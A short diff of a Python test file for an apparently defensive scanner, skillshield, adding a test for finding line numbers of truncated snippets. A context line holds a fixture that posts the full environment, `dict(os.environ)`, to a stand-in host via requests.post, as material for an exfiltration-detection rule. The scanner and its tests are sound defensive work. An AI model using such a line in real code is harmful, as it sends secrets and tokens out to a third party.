@@ -297,6 +297,13 @@ class TestDataExfilRule:
         sg002 = [f for f in found if f.rule_id == "SG-002"]
         assert sg002 and sg002[0].line_numbers == [7]
 
+    def test_a_cut_short_snippet_is_found_on_every_line_that_starts_like_it(self):
+        from skillshield.scanner import _find_all_line_numbers
+
+        snippet = "A" * 80 + "..."
+        text = "A" * 100 + "\n# " + "A" * 80 + "..."
+        assert _find_all_line_numbers(text, [snippet]) == [1, 2]
+
     def test_the_snippet_shows_the_environment_on_a_long_line(self):
         padding = "x" * 300
         text = f"requests.post('https://example.com/{padding}', data=dict(os.environ))"
